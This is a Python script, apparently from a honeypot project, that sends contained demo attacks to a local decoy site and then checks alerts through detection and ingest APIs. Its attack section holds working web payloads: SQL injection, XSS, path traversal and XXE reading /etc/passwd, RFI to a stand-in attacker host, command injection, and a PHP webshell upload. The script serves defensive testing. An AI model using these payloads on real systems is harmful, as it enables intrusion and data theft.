import os
import sys
import time
import json
import urllib.request
import urllib.parse
import http.client
import subprocess

BASE_URL = "http://127.0.0.1:8088"
INGEST_URL = "http://127.0.0.1:8090"
OUTPUT_DIR = r"d:\A\A_5chai\honey_pot\hinh_anh_chuong_3"
SECRETS_DIR = r"d:\A\A_5chai\honey_pot\part_08_DOCKER_DEPLOYMENT\secrets"

os.makedirs(OUTPUT_DIR, exist_ok=True)

def get_secret(filename):
    path = os.path.join(SECRETS_DIR, filename)
    with open(path, "r", encoding="utf-8") as f:
        return f.read().strip()

analyst_key = get_secret("part3_analyst_api_key.txt")
ingest_key = get_secret("part3_ingest_api_key.txt")

print("[1] Generating Contained Attack Traffic...")

# Helper request function
def send_req(path, method="GET", data=None, headers=None):
    if headers is None:
        headers = {}
    headers["User-Agent"] = "Honeypot-Full-System-Demo/1.0"
    url = f"{BASE_URL}{path}"
    
    if data and isinstance(data, dict):
        encoded_data = urllib.parse.urlencode(data).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    elif data and isinstance(data, (bytes, str)):
        encoded_data = data if isinstance(data, bytes) else data.encode("utf-8")
    else:
        encoded_data = None
        
    req = urllib.request.Request(url, data=encoded_data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except Exception as e:
        return 0, str(e)

# 1. SQL Injection
status, body = send_req("/auth/login", method="POST", data={"username": "admin' OR '1'='1' --", "password": "demo-password"})
print(f"  - SQLi: status={status}, decoy_contained={'stat-box' in body}")

# 2. Brute Force (5+ attempts)
for i in range(1, 7):
    send_req("/auth/login", method="POST", data={"username": "admin", "password": f"wrong-pass-{i}"})
print("  - Brute Force: 6 login attempts sent")

# 3. Reflected XSS
xss_payload = urllib.parse.quote("<svg onload=document.body.dataset.xss=1>")
status, body = send_req(f"/tra-cuu?q={xss_payload}")
print(f"  - Reflected XSS: status={status}, decoy_contained={'sandbox-frame' in body}")

# 4. Stored XSS
status, body = send_req("/gop-y", method="POST", data={"author": "demo-analyst", "body": "<script>document.body.dataset.demo='stored-xss'</script>"})
print(f"  - Stored XSS: status={status}, decoy_contained={'demo-analyst' in body}")

# 5. Path Traversal
traversal = urllib.parse.quote("../../../../etc/passwd")
status, body = send_req(f"/download?file={traversal}")
print(f"  - Path Traversal: status={status}, decoy_contained={'portal:x:1001' in body}")

# 6. IDOR
status, body = send_req("/ho-so/1003")
print(f"  - IDOR: status={status}, decoy_contained={'DECOY-SECRET-7F3A' in body}")

# 7. RFI
rfi = urllib.parse.quote("https://attacker.invalid/module.txt")
status, body = send_req(f"/tich-hop?url={rfi}")
print(f"  - RFI: status={status}, decoy_contained={'DECOY-RFI-4A21' in body}")

# 8. Unrestricted File Upload
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
body_parts = [
    f"--{boundary}".encode("utf-8"),
    b'Content-Disposition: form-data; name="file"; filename="webshell.php"',
    b'Content-Type: application/x-php',
    b'',
    b'<?php echo "contained-honeypot-test"; system($_GET["cmd"]); ?>',
    f"--{boundary}--".encode("utf-8"),
    b''
]
payload_bytes = b"\r\n".join(body_parts)
status, body = send_req("/upload", method="POST", data=payload_bytes, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
print(f"  - File Upload: status={status}, decoy_contained={'quarantine' in body or 'thành công' in body or 'alert-success' in body}")

# 9. Command Injection
cmd = urllib.parse.quote("127.0.0.1; whoami")
status, body = send_req(f"/diagnostics?host={cmd}")
print(f"  - Command Injection: status={status}, decoy_contained={'uid=33(www-data)' in body or 'www-data' in body}")

# 10. XXE
xxe = "<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>"
status, body = send_req("/xml/import", method="POST", data={"xml": xxe})
print(f"  - XXE: status={status}, decoy_contained={'portal:x:1001' in body}")

print("[2] Waiting for Forwarder to push events to Part 3 API...")
time.sleep(6)

# Query API stats
req = urllib.request.Request(f"{BASE_URL}/api/v1/stats/summary?hours=24", headers={"X-API-Key": analyst_key})
with urllib.request.urlopen(req) as resp:
    summary = json.loads(resp.read().decode())
    print("  -> Summary Stats:", json.dumps(summary, indent=2))

print("[3] Injecting ML Flow Feature and Suricata Alert to Ingest Gateway...")
# Send 1 ML prediction event directly through Ingest API
ml_event = {
    "events": [
        {
            "sensor_id": "ids-ml-sensor-01",
            "source_event_id": f"ml-flow-{int(time.time())}",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "src_ip": "192.168.1.150",
            "src_port": 49152,
            "dest_ip": "192.168.1.10",
            "dest_port": 8080,
            "protocol": "TCP",
            "event_type": "ml_detection",
            "severity": "high",
            "vulnerability": "ddos_syn_flood",
            "prediction": {
                "label": "DDoS",
                "confidence": 0.985,
                "model": "xgboost_original",
                "feature_profile": "ciciot2023-live-pcap-v1",
                "classes": ["Benign", "BruteForce", "DDoS", "DoS", "Mirai", "Recon", "Spoofing"],
                "probabilities": [0.001, 0.002, 0.985, 0.008, 0.001, 0.002, 0.001]
            },
            "signals": ["ml:xgboost_original:ddos", "flow:syn_flood_detected"],
            "raw_payload": "SYN flood flow with 1420 pkts/sec, rate=1420.5, Duration=3.2"
        },
        {
            "sensor_id": "suricata-sensor-01",
            "source_event_id": f"suricata-alert-{int(time.time())}",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "src_ip": "192.168.1.150",
            "src_port": 51234,
            "dest_ip": "192.168.1.10",
            "dest_port": 8080,
            "protocol": "TCP",
            "event_type": "alert",
            "severity": "critical",
            "vulnerability": "sql_injection",
            "signals": ["suricata:sid:9900001"],
            "raw_payload": "GET /tra-cuu?q=admin'%20OR%20'1'='1 HTTP/1.1",
            "details": {
                "signature": "HONEYPOT possible SQL injection",
                "signature_id": 9900001,
                "category": "web-application-attack"
            }
        }
    ]
}

ingest_req = urllib.request.Request(
    f"{INGEST_URL}/api/v1/events",
    data=json.dumps(ml_event).encode("utf-8"),
    headers={"Content-Type": "application/json", "X-API-Key": ingest_key},
    method="POST"
)
try:
    with urllib.request.urlopen(ingest_req) as resp:
        res = json.loads(resp.read().decode())
        print("  -> Ingest API Response:", res)
except Exception as e:
    print("  -> Ingest error:", e)

print("[4] Waiting 32 seconds for Correlation container to process rules...")
time.sleep(32)

# Check correlation alerts in API
alerts_req = urllib.request.Request(f"{BASE_URL}/api/v1/alerts?limit=10", headers={"X-API-Key": analyst_key})
try:
    with urllib.request.urlopen(alerts_req) as resp:
        alerts = json.loads(resp.read().decode())
        print("  -> Recent Alerts Count:", len(alerts.get("items", [])))
        for a in alerts.get("items", []):
            print(f"     Alert: {a.get('title')} [{a.get('severity')}] - Rule: {a.get('rule_id')}")
except Exception as e:
    print("  -> Alerts error:", e)

print("Finished generating evidence and populating database.")
